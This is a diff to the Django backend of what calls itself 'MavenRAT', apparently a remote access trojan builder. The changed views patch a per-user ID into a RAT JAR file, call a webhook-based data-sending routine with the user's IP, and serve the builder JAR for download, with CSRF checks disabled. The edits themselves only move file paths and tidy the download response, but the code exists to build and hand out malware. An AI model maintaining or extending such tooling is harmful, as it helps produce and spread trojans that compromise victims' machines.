@@ -6,6 +6,7 @@ import shutil
 import uuid
 import time
 import requests
+from django.conf import settings
 from django.http import JsonResponse, FileResponse, Http404
 from django.views.decorators.csrf import csrf_exempt
 
@@ -25,7 +26,7 @@ def Builder(request):
 
             process_and_send_data(user_id, user, ip, webhook)
 
-            jar_file_path = os.path.join(base_dir, 'MavenRAT', 'MavenRat1.0.jar')
+            jar_file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'rat', 'MavenRat1.0.jar')
             new_jar_content = replace_code_in_jar(jar_file_path, user_id)
 
             if new_jar_content is not None:
@@ -281,8 +282,10 @@ def Delivery(request):
 
 @csrf_exempt
 def builder_download(request):
-    file_path = 'C:/Users/Gustavo/Documents/MavenRAT/mavenrat/Download/MavenBuilder.jar'
+    file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'builder', 'MavenRat1.0.jar')
     if os.path.exists(file_path):
-        return FileResponse(open(file_path, 'rb'), as_attachment=True, filename='MavenBuilder.jar')
+        # Use FileResponse directly with the file path
+        response = FileResponse(open(file_path, 'rb'), as_attachment=True, filename='MavenRat1.0.jar')
+        return response
     else:
         raise Http404('File not found')
